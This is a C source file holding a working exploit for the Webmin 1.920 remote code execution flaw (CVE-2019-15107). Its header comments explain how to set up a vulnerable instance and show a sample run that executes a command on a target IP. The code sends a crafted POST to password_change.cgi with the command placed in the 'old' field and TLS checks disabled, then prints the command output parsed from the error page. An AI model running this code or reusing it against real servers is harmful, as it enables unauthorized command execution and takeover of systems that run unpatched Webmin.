////////////////////////////////////////////////////////////////////////////////////////////////
// Webmin 1.920 Remote Code Execution Exploit CVE_2019_15107.c muBoT Cut
// by BoSSaLiNiE
//
// Step 1
// wget https://netix.dl.sourceforge.net/project/webadmin/webmin/1.920/webmin_1.920_all.deb
//
// Step 2
// dpkg -i webmin_1.920_all.deb
//
//
// Step 3
// sed -i s/passwd_mode=0/passwd_mode=2/g /etc/webmin/miniserv.conf;service webmin restart
//
// Step 4
// gcc CVE_2019_15107.c -o CVE_2019_15107 -lcurl
//
// ./CVE_2019_15107 10.0.0.14 "uptime"
// https://10.0.0.14:10000/password_change.cgi
// 16:16:38 up 22:15,  0 user,  load average: 0.00, 0.00, 0.00
//
///////////////////////////////////////////////////////////////////////////////////////////////

#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>


int main(int argc,char* argv[])
{
	CURLU *h;
	CURL *curl;
	CURLcode res;
	curl_socket_t sockfd;

	char buffer[200];

	char ref[100];
	char url[100];


	struct string {
		char *ptr;
		size_t len;
	};

	void init_string(struct string *s) {
		s->len = 0;
		s->ptr = malloc(s->len+1);
		if (s->ptr == NULL) {
			fprintf(stderr, "malloc() failed\n");
			exit(EXIT_FAILURE);
		}
		s->ptr[0] = '\0';
	}

	size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
	{
		size_t new_len = s->len + size*nmemb;
		s->ptr = realloc(s->ptr, new_len+1);
		if (s->ptr == NULL) {
			fprintf(stderr, "realloc() failed\n");
			exit(EXIT_FAILURE);
		}
		memcpy(s->ptr+s->len, ptr, size*nmemb);
		s->ptr[new_len] = '\0';
		s->len = new_len;

		return size*nmemb;
	}


	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if(curl) {
		struct curl_slist *headers=NULL;

		struct string s;
		init_string(&s);

		headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate");
		headers = curl_slist_append(headers, "Accept: */*");
		headers = curl_slist_append(headers, "Accept-Language: en");
		headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)");
		headers = curl_slist_append(headers, "Connection: close");
		headers = curl_slist_append(headers, "Cookie: redirect=1; testing=1; sid=x; sessiontest=1");
		//	headers = curl_slist_append(headers, "Referer: https://192.168.233.134:10000/session_login.cgi");      
		headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
		headers = curl_slist_append(headers, "Content-Lenght: 60");
		headers = curl_slist_append(headers, "cache-control: no-cache");

		sprintf(url, "https://%s:10000/password_change.cgi", argv[1]);
		sprintf(ref, "https://%s:10000/session_login.cgi", argv[1]);

		curl_easy_setopt(curl, CURLOPT_REFERER, ref);
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers );
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

		char b64str[100000] = {0};
		sprintf(b64str, "user=rootxx&pam=&expired=2&old=%s&new1=test2&new2=test2",argv[2]);

		curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, b64str);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
		//  curl_easy_setopt (curl, CURLOPT_TIMEOUT, 10L);

		res = curl_easy_perform(curl);

		//////////////////////////FILTER//////////////////////////

		//  puts(s.ptr);
		const char *x = s.ptr;
		const char *PATTERN1 = "<center><h3>Failed to change password : The current password is incorrect";
		const char *PATTERN2 = "</h3></center>";

		char *target = NULL;
		char *start, *end;

		if ( start = strstr( x, PATTERN1 ) )
		{
			start += strlen( PATTERN1 );
			if ( end = strstr( start, PATTERN2 ) )
			{
				target = ( char * )malloc( end - start + 1 );
				memcpy( target, start, end - start );
				target[end - start] = '\0';
			}
		}

		if ( target ) 
			puts(url);
		puts( target );

		free( target );

		free(s.ptr);


	}
	return 0;
}

